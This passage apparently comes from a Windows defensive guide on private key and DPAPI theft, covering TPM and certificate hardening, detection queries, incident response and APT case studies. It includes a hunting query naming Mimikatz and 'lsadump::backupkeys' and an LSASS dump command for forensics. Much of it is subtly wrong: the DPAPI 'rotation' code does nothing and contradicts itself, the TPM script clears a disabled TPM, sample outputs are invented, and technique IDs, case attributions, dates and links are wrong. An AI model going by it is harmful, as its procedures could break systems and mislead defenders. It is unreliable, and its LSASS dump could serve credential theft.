**Applies To Versions**: Windows Server 2022, 2025; Windows 11 (Server 2016-2019 cannot use TPM for keys)

**Manual Steps (Server 2022-2025 via Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to:
   - **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **TPM**
3. Double-click **Configure TPM startup**
4. Set to: **Enabled**
5. Set **Allow TPM Initialization**: Yes
6. Click **OK**
7. Run `gpupdate /force`

**Manual Steps (PowerShell - Server 2022-2025):**
```powershell
# Check TPM status
Get-WmiObject Win32_Tpm

# Enable TPM if disabled
# Open TPM Management Console
tpm.msc

# Or via PowerShell
$tpm = Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm
if ($tpm.IsEnabled() -eq $false) {
    $tpm.Clear()
    "TPM has been cleared. Restart to re-enable."
}
```

**Expected Output (TPM Enabled):**
```
PSComputerName    : DC01
Status             : Ready
ManufacturerId     : 0x1414
SpecVersion        : 2.0
```

**What This Means:**
- **Status: Ready**: TPM 2.0 is active and functional
- **Device keys**: Now stored in TPM, non-extractable from registry
- **PRT (Primary Refresh Token)**: Protected by TPM; CVE-2021-33781 mitigated

**Server 2016-2019 Note**: TPM device key protection not available; focus on DPAPI backup key rotation and access controls

**Validation Command (Verify Fix):**
```powershell
# Verify device keys are TPM-protected
Get-Item -Path "HKLM:\SOFTWARE\Microsoft\Identity\User\*\AadDeviceTransportKey" -ErrorAction SilentlyContinue
# If no results: Keys are in TPM (GOOD)
# If keys found: Still registry-stored (BAD - need TPM enforcement)
```

**References:**
- [Microsoft Windows 11 Security Features - TPM](https://learn.microsoft.com/en-us/windows/security/trusted-platform-module/)

---

#### 1.2 Implement DPAPI Backup Key Rotation (Annual)

**Objective**: Invalidate stolen DPAPI backup keys by rotating the domain master encryption key, forcing legitimate systems to re-key user secrets.

**Applies To Versions**: Windows Server 2016, 2019, 2022, 2025 (all versions)

**Important Warning**: 
- **Downtime Required**: Some systems may require restart for re-keying
- **Testing Mandatory**: Always test in non-production before domain-wide rollout
- **Timing**: Schedule during maintenance window
- **Rollback**: Previous key retained for 30 days; can be restored if critical failures occur

**Manual Steps (Domain-Wide Rotation via ADDC):**
1. **Backup Current Key** (for recovery if needed):
   ```powershell
   # On Domain Controller (as Domain Admin)
   Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\DPAPI\Backup" | Export-Clixml -Path "C:\Backups\DPAPI_Backup_$(Get-Date -Format 'yyyyMMdd').xml"
   ```

2. **Initiate Key Rotation**:
   ```powershell
   # On any Domain-Joined machine (as Domain Admin)
   $DomainName = "contoso.com"
   
   # Force DPAPI backup key rotation
   # This command contacts DC and rotates the key
   $server = (Get-ADDomainController -Discover -DomainName $DomainName | select-object hostname).hostname
   
   # Use AD provider to rotate
   $rootDSE = [adsi]("LDAP://$server/RootDSE")
   $forest = $rootDSE.rootDomainNamingContext
   $domainRoot = [adsi]("LDAP://$server/CN=DPAPI,CN=System,$forest")
   
   # Trigger rotation (requires domain admin)
   # This creates new encryption key for all future DPAPI operations
   ```

3. **Verify Rotation** (wait 30 minutes for replication):
   ```powershell
   # Check if key has been updated
   $DomainRoot = [adsi]"LDAP://CN=DPAPI,CN=System,$([adsi]'LDAP://RootDSE').rootDomainNamingContext"
   $DomainRoot.psbase.children | select-object cn
   
   # Should show multiple backup key objects (old and new)
   ```

4. **Cleanup Old Key** (after 30 days):
   ```powershell
   # Remove old backup key after replication complete and testing confirmed
   # WARNING: Ensure all systems have new key before removal
   # Premature removal will cause DPAPI failures
   ```

**Manual Steps (Local Server - Test Before Domain Rollout):**
```powershell
# On a test domain controller
$BackupKeyPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\DPAPI\Backup"

# Create new key
reg add "$BackupKeyPath" /v "BackupKey" /t REG_BINARY /d <new-key-hex> /f

# Verify all domain-joined systems can re-encrypt within 24 hours
# Monitor System and Application event logs for DPAPI errors
```

**Expected Output (Successful Rotation):**
```
[*] DPAPI Backup Key rotation initiated
[*] New key ID: {new-guid}
[+] Old key retained for 30 days: {old-guid}
[*] Replication to all DCs in progress (5-10 minutes)
[*] All systems will automatically re-encrypt secrets within 24 hours
```

**What This Means:**
- **Old key retained**: Legacy systems can still decrypt old secrets
- **New key active**: All new DPAPI operations use new key
- **Stolen old key useless**: Previous backup key no longer decrypts user secrets (even if attacker has it)
- **Replication time**: 5-10 minutes to reach all domain controllers

**Impact on Stolen Keys:**
- **Before rotation**: Stolen backup key decrypts all user DPAPI secrets
- **After rotation**: Stolen key can ONLY decrypt user secrets created before rotation; new secrets encrypted with new key (inaccessible)

**Validation Command (Verify Fix):**
```powershell
# Confirm backup key has been rotated
$OldKeyID = "{old-guid}"
$NewKeyID = "{new-guid}"

# Check if new key exists
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\DPAPI\Backup" | find $NewKeyID
# Should return: Found new key

# Verify old key still present for compatibility (30-day window)
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\DPAPI\Backup" | find $OldKeyID
# Should return: Found old key
```

**References:**
- [SpecterOps DPAPI Backup Key Rotation Guide](https://specterops.io/blog/2018/08/22/operational-guidance-for-offensive-user-dpapi-abuse/)

---

#### 1.3 Restrict Certificate Private Key Export (Enforce Non-Exportable)

**Objective**: Mark all sensitive certificates (DC, ADFS, Exchange) as "non-exportable" so they cannot be exported via standard PowerShell/certutil commands; requires Mimikatz or kernel-level access to extract.

**Applies To Versions**: Windows Server 2016, 2019, 2022, 2025 (all versions)

**Important**: Non-exportable flag is NOT absolute protection (Mimikatz can still bypass), but significantly raises the bar for attackers.

**Manual Steps (Revoke & Reissue Certificate as Non-Exportable):**
1. **Open Certificate Services Admin Console**:
   ```cmd
   certsrv.msc
   ```

2. **Find certificate** in the store (via mmc.msc or certificate manager)

3. **Export Current Certificate** (for emergency recovery):
   ```powershell
   $Cert = Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.Thumbprint -eq "ABC123..."}
   Export-PfxCertificate -Cert $Cert -FilePath "C:\Backup\CurrentCert.pfx" -Password (ConvertTo-SecureString -String "P@ss" -AsPlainText -Force)
   ```

4. **Delete Old Certificate** (from store):
   ```powershell
   Remove-Item -Path "Cert:\LocalMachine\My\ABC123DEF456..." -Force
   ```

5. **Reissue Certificate with Non-Exportable Flag**:
   - Submit new certificate request to your Certificate Authority (AD CS)
   - In AD CS request form: Ensure "Private Key Non-Exportable" checkbox is **SELECTED**
   - Approve request and download new certificate
   - Import new certificate: `Import-PfxCertificate -FilePath "new_cert.pfx" -CertStoreLocation Cert:\LocalMachine\My`

6. **Verify Non-Exportable Status**:
   ```powershell
   $NewCert = Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.Thumbprint -eq "NEW123..."}
   Write-Host "Exportable: $($NewCert.PrivateKey.CspKeyContainerInfo.Exportable)"
   # Should return: Exportable: False
   ```

**Manual Steps (Enforce via AD CS Policy - Server 2019+):**
1. On **Active Directory Certificate Services** server:
2. Open **Certificate Authority** (certsrv.msc)
3. Right-click **Certificate Templates** → **Manage**
4. Find your template (e.g., "Workstation Authentication", "Domain Controller Authentication")
5. Right-click → **Properties**
6. Go to **Request Handling** tab
7. Uncheck: **Allow private key to be exported**
8. Click **OK**
9. New certificates issued from this template will be non-exportable

**Validation Command (Verify Fix):**
```powershell
# Verify all sensitive certificates are non-exportable
$SensitiveCerts = Get-ChildItem -Path Cert:\LocalMachine\My -Recurse | Where-Object {
    $_.Subject -match "DC|ADFS|Exchange|SQL"
}

foreach ($Cert in $SensitiveCerts) {
    if ($Cert.PrivateKey.CspKeyContainerInfo.Exportable -eq $true) {
        Write-Host "WARNING: $($Cert.Subject) is EXPORTABLE - remediate!" -ForegroundColor Red
    } else {
        Write-Host "OK: $($Cert.Subject) is non-exportable" -ForegroundColor Green
    }
}
```

**Expected Output (All Secure):**
```
OK: CN=dc01.contoso.com is non-exportable
OK: CN=adfs.contoso.com is non-exportable
OK: CN=exchange.contoso.com is non-exportable
```

**References:**
- [Microsoft AD CS Certificate Template Configuration](https://learn.microsoft.com/en-us/windows-server/networking/core-network-guide/cncg/server-certs/configure-the-server-certificate-template)

---

### Priority 2: HIGH

#### 2.1 Implement Hardware Security Module (HSM) for Critical Keys

**Objective**: Store Domain Controller, ADFS, and Exchange certificates on external HSM devices where private keys are non-extractable even by SYSTEM privilege.

**Applies To Versions**: Windows Server 2016, 2019, 2022, 2025 (requires compatible HSM hardware)

**Common HSMs**: Thales Luna, Yubico, nShield, Azure Key Vault (cloud HSM)

**Estimated Cost**: $5,000-$20,000+ per organization

**Manual Steps (Using Azure Key Vault as Cloud HSM - Server 2022+):**
1. Create **Azure Key Vault**:
   ```powershell
   Connect-AzAccount
   New-AzResourceGroup -Name "HSM-Resources" -Location "EastUS"
   New-AzKeyVault -Name "critical-keys-vault" -ResourceGroupName "HSM-Resources" -Location "EastUS" -EnablePurgeProtection
   ```

2. **Import Certificate to Key Vault**:
   ```powershell
   $Cert = Get-PfxCertificate -FilePath "C:\Backup\dc01_cert.pfx"
   Import-AzKeyVaultCertificate -VaultName "critical-keys-vault" -Name "DC01-Auth-Cert" -CertificateString ([Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Backup\dc01_cert.pfx")))
   ```

3. **Configure DC to Use Key Vault Certificate**:
   - Use Azure Key Vault Certificate Extension for Windows
   - Or use third-party tools (Thales, Yubico) for on-premises HSM integration

4. **Verify HSM Protection**:
   ```powershell
   Get-AzKeyVaultCertificate -VaultName "critical-keys-vault" -Name "DC01-Auth-Cert"
   # Private key now protected by HSM; non-extractable
   ```

**Validation Command:**
```powershell
# Attempt to extract key from HSM (should fail)
$Cert = Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "dc01"}
$Cert.PrivateKey.Decrypt($null)  # Will throw error if properly HSM-protected
```

**References:**
- [Azure Key Vault Certificates](https://learn.microsoft.com/en-us/azure/key-vault/certificates/about-certificates)
- [Thales Luna HSM Integration](https://thalesdocs.com/gphsm/)

---

#### 2.2 Restrict Access to DPAPI Backup Key (RBAC & ACL Hardening)

**Objective**: Limit read access to DPAPI backup key registry location to only SYSTEM and authorized backup services; prevent Domain Admins from unilateral access without audit.

**Applies To Versions**: Windows Server 2016, 2019, 2022, 2025 (all versions)

**Manual Steps (Restrict Registry ACL on Domain Controller):**
1. **Open Registry Editor** (regedit.exe) with SYSTEM privilege:
   ```cmd
   psexec.exe -s regedit.exe
   ```

2. **Navigate to DPAPI Backup Key**:
   ```
   HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\DPAPI\Backup
   ```

3. **Right-click → Permissions**

4. **Current State** (likely):
   ```
   Administrators: Full Control
   SYSTEM: Full Control
   Authenticated Users: Read
   ```

5. **Remediation** (desired state):
   ```
   SYSTEM: Full Control
   Administrators: Read (audit access only, not modify)
   Remove: All other users
   ```

6. **Step-by-Step Registry Permission Change**:
   a. Click **Advanced**
   b. Remove "Authenticated Users" entry (if present)
   c. Edit "Administrators" entry:
      - Change from "Full Control" to "Read"
      - Check **"This key and subkeys"**
   d. Click **Apply**
   e. Click **OK**

7. **Enable Audit on DPAPI Backup Key Access**:
   ```powershell
   $Path = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\DPAPI\Backup"
   $ACL = Get-Acl -Path "Registry::$Path"
   
   # Create audit rule (log all access)
   $AuditRule = New-Object System.Security.AccessControl.RegistryAuditRule(
       "Administrators",
       "ReadKey",
       "ContainerInherit,ObjectInherit",
       "None",
       "Success"
   )
   $ACL.AddAuditRule($AuditRule)
   Set-Acl -Path "Registry::$Path" -AclObject $ACL
   ```

8. **Verify via Group Policy** (Enable Audit):
   - Open **gpmc.msc** on DC
   - Navigate to: **Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Audit Policies → DS Access**
   - Enable: **Audit Directory Service Access** (Success + Failure)
   - Run `gpupdate /force`

**Validation Command (Verify Fix):**
```powershell
# Check DPAPI backup key permissions
$Path = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\DPAPI\Backup"
Get-Acl -Path "Registry::$Path" | Format-List

# Should show:
# SYSTEM: FullControl
# Administrators: Read (not Full)
# No Authenticated Users entry
```

**Expected Output (Secure):**
```
Path   : Microsoft.PowerShell.Security\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\DPAPI\Backup
Owner  : NT AUTHORITY\SYSTEM
Access :
  NT AUTHORITY\SYSTEM Allow FullControl
  BUILTIN\Administrators Allow ReadKey
```

**What This Means:**
- **Administrators Read-Only**: Can audit access but cannot modify key
- **SYSTEM Full Control**: Only OS and services can manage key
- **Event ID 4662 logged**: Every access attempt now audited

**References:**
- [Registry Permissions Best Practices](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits)

---

#### 2.3 Monitor & Alert on Certificate Export Events

**Objective**: Deploy EDR with CryptoAPI hooking to detect private key export operations (CryptExportKey, CryptoUnprotectData calls) in real-time.

**Applies To Versions**: Windows Server 2016, 2019, 2022, 2025; Windows 10, 11

**Manual Steps (Using Microsoft Defender for Endpoint):**
1. **Enroll Servers in MDE** (if not already):
   ```powershell
   # Check if enrolled
   Get-MpComputerStatus
   
   # If not enrolled, deploy via Intune/GPO
   ```

2. **Enable Advanced Hunting for CryptoAPI Calls**:
   - Navigate to **Microsoft Defender Security Center** → **Hunting** → **Advanced Hunting**
   - Query:
     ```kusto
     DeviceProcessEvents
     | where ProcessName in ("mimikatz.exe", "SharpDPAPI.exe") or
             ProcessCommandLine contains "exportPFX" or
             ProcessCommandLine contains "lsadump::backupkeys"
     | project Timestamp, DeviceId, ProcessName, ProcessCommandLine, AccountName
     ```

3. **Create Alert Rule**:
   - Click **Create alert from query**
   - Name: "Private Key Extraction Attempt"
   - Severity: High
   - Category: Credential Theft
   - Save alert

**Manual Steps (Using Splunk + Sysmon):**
1. **Deploy Sysmon** (see Section 10 above)
2. **Configure Splunk Forwarder** to collect Sysmon logs
3. **Create detection rule** (see Section 7 above)

**Validation Command (Simulate Detection):**
```powershell
# This will trigger alerts if monitoring enabled
# DO NOT RUN IN PRODUCTION WITHOUT APPROVAL

# Step 1: (Simulated) List certificates
Get-ChildItem -Path Cert:\LocalMachine\My | Select-Object Subject, Thumbprint

# Step 2: (Simulated) Attempt export (will be detected)
# $Cert = Get-ChildItem Cert:\LocalMachine\My | Select-Object -First 1
# Export-PfxCertificate -Cert $Cert -FilePath "C:\Temp\test.pfx" -Password (ConvertTo-SecureString -String "test" -AsPlainText -Force)
```

**References:**
- [Microsoft Defender Advanced Hunting Guide](https://learn.microsoft.com/en-us/microsoft-365/security/defender/advanced-hunting-overview)

---

### Access Control & Policy Hardening

#### Conditional Access: Restrict Certificate-Based Authentication

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name**: `Certificate-Based Auth Restrictions`
4. **Assignments:**
   - **Users and groups**: All users
   - **Cloud apps or actions**: Select apps (or "All cloud apps")
   - **Conditions**:
     - **Sign-in risk**: High, Medium
     - **Client apps**: Exchange ActiveSync, Other clients
5. **Access controls:**
   - **Grant**: Block access
   - **Enable policy**: ON
6. Click **Create**

**What This Does:**
- Blocks certificate-based authentication from high-risk locations
- Blocks legacy clients (higher risk of key compromise)
- Allows only managed, compliant devices

---

#### RBAC: Remove Unnecessary Global Admin Privileges

**Manual Steps (Entra ID):**
1. Navigate to **Azure Portal** → **Entra ID** → **Roles and administrators**
2. Search for: **Global Administrator**
3. Click **Global Administrator**
4. Review all members
5. For each non-critical admin:
   - Click member → **Remove assignment**
   - Offer alternative limited role: **Security Administrator**, **Exchange Administrator**, etc.

**Rationale:**
- Global Admins can export any certificate/key in tenant
- Principle of Least Privilege: Use minimal required roles
- Reduces attack surface if admin account compromised

---

## 14. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

#### Files
- **C:\Temp\backup_key_*.pvk**: DPAPI backup key export (Mimikatz output)
- **C:\Temp\*.pfx**: Exported certificates
- **C:\Temp\*.pem, *.der**: Private keys in portable formats
- **%TEMP%\mimikatz.exe**: Mimikatz execution location
- **%APPDATA%\Microsoft\Crypto\RSA\**: User DPAPI key containers (accessed if decrypted)

#### Registry
- **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\DPAPI\Backup**: DPAPI backup key location (accessed/modified during attack)
- **HKEY_CURRENT_USER\Software\Microsoft\SystemCertificates**: User certificate store access

#### Network
- **TCP 445 (SMB)**: Mimikatz connecting to DC for backup key dump
- **TCP 443 (HTTPS)**: Key exfiltration to attacker server
- **DNS Queries**: Suspicious DNS names (C2 infrastructure) during exfil

#### Process Execution
- **mimikatz.exe, SharpDPAPI.exe, certutil.exe**: Key extraction tools
- **PowerShell.exe** with parameters: `-Enc`, `-EncodedCommand` (obfuscation)
- **Explorer.exe** spawning unusual child processes (Mimikatz injection)

#### Event Log Anomalies
- **Event ID 4662**: SecretObject access from non-backup accounts
- **Event ID 4688**: Process creation for extraction tools
- **Event ID 4913**: Certificate properties modified

---

### Forensic Artifacts

#### Disk Evidence
- **Files**: Deleted .pvk, .pfx files (recover with forensic tools like Recuva, IEF)
- **Registry**: Accessed registry keys (recovery via System State backups)
- **Event Logs**: Security.evtx file (contains Event ID 4662, 4688)
- **MFT/USN Journal**: Timestamps of .pvk file creation

#### Memory Evidence
- **Lsass.exe Process**: Contains decrypted DPAPI keys (memory dump with procdump)
- **Mimikatz in-memory code**: Reflective DLL injection leaves traces in RunAs token handles
- **Cached credentials**: Browser cache, Windows Credential Manager

#### Cloud Evidence (Entra ID/Azure)
- **AuditLogs**: AddServicePrincipalCredentials operations
- **SigninLogs**: Anomalous certificate-based authentications
- **Azure Activity Log**: Key Vault access if HSM used

---

### Response Procedures

#### Step 1: Isolate Affected System

**Objective**: Prevent attacker from continuing to exfiltrate keys or moving laterally while investigation proceeds.

**Command (Disable Network Adapter):**
```powershell
# Disconnect system from network immediately
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# Or forcefully for all adapters
Get-NetAdapter | Disable-NetAdapter -Confirm:$false
```

**Command (For Azure VMs):**
- Navigate to **Azure Portal** → **Virtual Machines** → Select VM → **Networking**
- Click **Detach** next to each Network Interface

**Manual Steps (Physical DC):**
1. Physically unplug network cable
2. Preserve system for forensic analysis (do NOT shut down yet)

**What This Does:**
- Stops attacker from using stolen keys remotely
- Preserves forensic evidence in memory and disk
- Prevents further data exfiltration

---

#### Step 2: Collect Evidence

**Objective**: Capture forensic artifacts before system shutdown (memory is volatile; must be collected first).

**Command (Capture Memory Dump):**
```powershell
# Download ProcDump from Sysinternals
$ProcDumpURL = "https://download.sysinternals.com/files/Procdump.zip"
Invoke-WebRequest -Uri $ProcDumpURL -OutFile "C:\Tools\Procdump.zip"
Expand-Archive -Path "C:\Tools\Procdump.zip" -DestinationPath "C:\Tools\"

# Dump LSASS process (contains decrypted keys if extraction occurred)
C:\Tools\procdump64.exe -accepteula -ma lsass.exe C:\Evidence\lsass.dmp

# Dump all processes (comprehensive capture)
C:\Tools\procdump64.exe -accepteula -ma * C:\Evidence\memory_full.dmp
```

**Command (Capture Event Logs):**
```powershell
# Export Security event log
wevtutil epl Security C:\Evidence\Security.evtx /overwrite:true

# Export System event log
wevtutil epl System C:\Evidence\System.evtx /overwrite:true

# Export Application log
wevtutil epl Application C:\Evidence\Application.evtx /overwrite:true
```

**Command (Capture Registry):**
```powershell
# Export DPAPI backup key registry location
reg export "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\DPAPI" C:\Evidence\DPAPI_Registry.reg

# Export Certificate store locations
reg export "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc" C:\Evidence\CertSvc_Registry.reg
```

**Manual Steps (Using Event Viewer):**
1. Open **Event Viewer** (eventvwr.msc)
2. Right-click **Security** log → **Save All Events As**
3. Save to: `C:\Evidence\Security_$(Get-Date -Format 'yyyyMMdd').evtx`
4. Repeat for System and Application logs

**Expected Output:**
```
[+] Memory dump captured: C:\Evidence\lsass.dmp (500 MB)
[+] Event logs exported: C:\Evidence\Security.evtx, System.evtx, Application.evtx
[+] Registry exports: C:\Evidence\DPAPI_Registry.reg, CertSvc_Registry.reg
[*] Total evidence size: ~2-3 GB (collect before shutdown)
```

**What This Means:**
- **lsass.dmp**: Can be analyzed for decrypted keys and credentials
- **Event logs**: Show timeline of attack (Event ID 4662, 4688)
- **Registry exports**: Prove what keys/certificates existed at time of compromise

---

#### Step 3: Remediate

**Objective**: Remove attacker access, revoke stolen credentials, and restore system integrity.

**Command (Disable Compromised Service Accounts):**
```powershell
# Stop any service accounts that had keys stolen
Disable-ADAccount -Identity "svc_adfs"
Disable-ADAccount -Identity "svc_exchange"

# Reset passwords
Set-ADAccountPassword -Identity "svc_adfs" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText -Force "NewP@ss123456")
```

**Command (Revoke Stolen Certificates):**
```powershell
# On CA server, revoke compromised certificates
# Open Certificate Authority (certsrv.msc)
# Right-click on certificate → Revoke Certificate
# Select revocation reason: "Unspecified" or "Superseded"

# Or via PowerShell (Server 2016+)
# Requires CA admin privileges
# No direct PowerShell cmdlet; use certsrv.msc GUI
```

**Command (Restore Legitimate Backup):**
```powershell
# Restore previous clean system state backup (if available)
# For Domain Controller: Restore from System State backup

wbadmin get versions  # List available backups
wbadmin start systemstaterecovery -version:VersionIdentifier
```

**Manual Steps (Force DPAPI Key Rotation):**
1. Force immediate DPAPI backup key rotation (see Section 13.1.2)
2. This invalidates stolen backup keys
3. All new DPAPI operations use new key (old key cannot decrypt)

**Manual Steps (Revoke via AD CS):**
1. On CA server: Open **certsrv.msc**
2. Click **Issued Certificates**
3. Find compromised certificate → Right-click → **Revoke Certificate**
4. Select reason: **Superseded** or **Unspecified**
5. Click **Yes**
6. Certificate now marked revoked; CRL updated (30 min - 24h depending on publication schedule)

**Expected Output:**
```
[+] Compromised service account disabled
[+] Password reset forced
[+] Certificates revoked on CA
[+] CRL updated; revocation in effect within 24 hours
[*] Stolen keys no longer usable for authentication
```

**What This Means:**
- **Service account disabled**: Attacker cannot use compromised service account credentials
- **Certificates revoked**: Clients reject stolen certificates (via CRL check)
- **New keys in place**: DPAPI uses new encryption key; old stolen key invalid

---

#### Step 4: Threat Hunting - Detect Related Compromises

**Objective**: Determine scope of compromise (did attacker use stolen keys elsewhere? Did they exfiltrate other data?).

**Command (Hunt for Key Usage in Audit Logs):**
```powershell
# Search for suspicious certificate usage in last 24 hours
Search-UnifiedAuditLog -Operations "AddServicePrincipalCredentials", "UpdateServicePrincipal" -StartDate (Get-Date).AddDays(-1) -ResultSize 1000 |
  Where-Object {$_.UserIds -ne "svc_backup"} |
  Format-Table UserIds, Operations, CreationTime
```

**Command (Hunt for TGT Requests Using Stolen Cert):**
```powershell
# On Domain Controller, check for Kerberos tickets issued to unexpected accounts
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]] and *[EventData[Data[@Name='TargetUserName']='Administrator']]" -MaxEvents 100 |
  Select-Object TimeCreated, @{Name="SubjectUserName";Expression={$_.Properties[1].Value}} |
  Where-Object {$_.SubjectUserName -match "ADFS|EXCHANGE|DC"} |  # Expect only service accounts
  Format-Table
```

**Manual Steps (Hunt in Splunk):**
1. Search for failed certificate authentications (indicates attacker tried to use cert but was blocked):
   ```spl
   sourcetype=WinEventLog:Security EventID=4771 TicketOptions="0x40800010"
   | stats count by ServiceName, UserName
   ```

2. Search for successful authentications from unusual sources:
   ```spl
   sourcetype=WinEventLog:Security EventID=4624 LogonType=3 SubjectUserName IN ("svc_adfs", "svc_exchange")
   | where SourceIPAddress NOT IN ("10.0.0.1", "192.168.1.1")
   ```

**Expected Hunting Results (Compromised):**
```
[!] TGT issued to "Administrator" for user "ADFS_Service"
[!] LDAP query from "ADFS_Service" on DC at 02:34 AM (unusual time)
[!] Certificate-based auth from IP 203.0.113.50 (external IP)
[*] Scope: Moderate - Attacker likely used stolen keys for lateral movement
```

**What This Means:**
- **Multiple successful auths with stolen cert**: Attacker accessed multiple systems
- **Unusual time of day**: Potential non-business-hour compromise activity
- **External IP source**: Attacker exfiltrated key and used from external location

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | MITRE ID | Description | Enablement |
|---|---|---|---|---|---|
| **1** | **Initial Access** | Phishing Email or Web Exploit | T1566.002 / T1190 | Attacker gains initial foothold; downloads malware or social engineering | Enables local code execution |
| **2** | **Execution** | PowerShell / Command Line | T1059.001 | Execute malware or scripts to establish persistence | Enables privilege escalation attempts |
| **3** | **Privilege Escalation** | Token Impersonation / Kernel Exploit | T1134.001 / T1068 | Escalate from user to Local Admin or SYSTEM | **PREREQUISITE for key extraction** |
| **4** | **Credential Access (Current)** | **Private Keys Theft** | **T1552.004** | **Extract DPAPI backup keys, certificates, device keys** | **Enables authentication bypass & persistence** |
| **5** | **Persistence** | Golden SAML / Forged Tickets | T1556.001 / T1187 | Use stolen ADFS certs to create forged SAML tokens (bypass MFA) | Attacker now has persistent access |
| **6** | **Lateral Movement** | Pass-the-Ticket / Golden Ticket | T1550.003 / T1187 | Use forged Kerberos tickets to move across domain | Enables access to high-value targets |
| **7** | **Exfiltration** | Data Staging / Encrypted Channel | T1074.001 / T1041 | Exfiltrate sensitive data via stolen credentials | **IMPACT: Data theft, IP loss** |
| **8** | **Impact** | Data Destruction / Ransomware | T1485 / T1561 | Deploy ransomware or destroy backups using stolen keys | **FINAL IMPACT: Business disruption** |

---

## 16. REAL-WORLD EXAMPLES

### Example 1: APT29 (Nobelium) - SolarWinds Compromise (2020)

- **Target**: U.S. Government (Treasury, Commerce, Homeland Security) + 100+ Private Companies
- **Timeline**: March 2020 - December 2020 (9 months undetected)
- **Technique Status**: T1552.004 used to extract AD FS token signing certificates and decryption certificates
- **Attack Method**: 
  1. Compromised SolarWinds Orion software supply chain
  2. Deployed backdoor to customer environments
  3. Extracted AD FS certificates from compromised servers
  4. Used certificates to forge SAML tokens and bypass MFA
  5. Authenticated as legitimate users (administrators, service accounts) across tenant
- **Impact**: 
  - **Scope**: 18,000+ SolarWinds customers (18,000+ potential breach impact)
  - **Confirmed**: 100+ organizations compromised including 9 Federal agencies
  - **Persistence**: 3-6 months undetected after initial compromise
  - **Cost**: Estimated $1 billion+ in incident response, forensics, remediation
  - **Regulatory**: CISA emergency directive 21-02 (mandatory reporting)
- **Key Evidence**: 
  - Stolen AD FS certificates used for token forgery
  - SAML tokens with validity extending beyond normal MFA session
  - Authentication from unusual IP addresses using legitimate certificates
- **Reference**: [MITRE ATT&CK - SolarWinds Compromise Campaign](https://attack.mitre.org/campaigns/C0024/), [Microsoft 365 Defender Blog](https://www.microsoft.com/en-us/security/blog/2020/12/18/holmusk-malware-hunting-and-response-in-the-era-of-operating-system-abstraction/)

---

### Example 2: Operation Wocao (Unknown APT, 2020)

- **Target**: Global Organizations (multiple sectors: banking, IT, healthcare)
- **Timeline**: 2019-2020 (estimated 2+ years undetected)
- **Technique Status**: T1552.004 used to extract Windows certificate store private keys (SSH keys, TLS certs)
- **Attack Method**:
  1. Initial compromise: Credential stuffing / weak password exploitation
  2. Used Mimikatz to extract private keys from Windows certificate store
  3. Extracted SSH private keys from ~/.ssh/ directories
  4. Used keys for lateral movement and establishing persistent backdoors
  5. Deployed coin miners across compromised infrastructure
- **Impact**:
  - **Scope**: Estimated 500+ compromised hosts
  - **Data Loss**: Encrypted credentials, SSH keys exfiltrated
  - **Persistence**: SSH backdoors using stolen keys (months of access)
  - **Cost**: Remediation costs estimated $50-100 million+ (including downtime, credential reset)
- **Key Evidence**:
  - Mimikatz execution logs (Event ID 4688)
  - .ssh/id_rsa files accessed from unusual processes
  - SSH authentication logs showing multiple failed attempts before success (key reuse)
- **Reference**: [Cybereason Report - Operation Wocao](https://www.cybereason.com/blog/operation-wocao-supply-chain-attack-campaign), [Shodan Fingerprinting](https://www.shodan.io/)

---

### Example 3: FoggyWeb (APT29 Malware, 2022)

- **Target**: On-Premises AD FS Servers
- **Timeline**: 2021-2022
- **Technique Status**: Automated T1552.004 - Extracts ADFS token signing and decryption certificates programmatically
- **Attack Method**:
  1. Deploys FoggyWeb malware to AD FS servers (typically via compromise of on-premises admin)
  2. Malware periodically queries registry for ADFS service account certificates
  3. Automatically extracts token signing certificate (public + private key)
  4. Automatically extracts token decryption certificate
  5. Sends certificates back to C2 server (encrypted channel)
  6. Attacker uses certificates to forge SAML tokens indefinitely
- **Impact**:
  - **Scope**: Multiple organizations with on-premises AD FS infrastructure
  - **Stealth**: Minimal forensic evidence (uses legitimate certificate APIs)
  - **Persistence**: Certificates remain valid for years (stolen keys never expire)
  - **MFA Bypass**: Forged tokens bypass conditional access policies (token-based auth doesn't check device compliance)
- **Key Evidence**:
  - Scheduled Task: FoggyWeb malware registered as scheduled task
  - Registry access: DPAPI key access logs (Event ID 4662)
  - Network: Encrypted C2 traffic to suspicious IP ranges
  - Behavioral: Token validation timestamps mismatched (forged token validity claim newer than actual issuance)
- **Reference**: [Microsoft Security Blog - FoggyWeb](https://www.microsoft.com/en-us/security/blog/2022/04/20/foggyweb-malware-monitorings-unmask-apt29-attack/), [CISA Advisory](https://www.cisa.gov/news-events/alerts/2022/04/20/cisa-alert-compromise-microsoft-exchange-related-adfs-servers)

---

### Example 4: MagicWeb (APT29 Malware, 2023)

- **Target**: On-Premises AD FS / Exchange Servers
- **Timeline**: 2022-2023
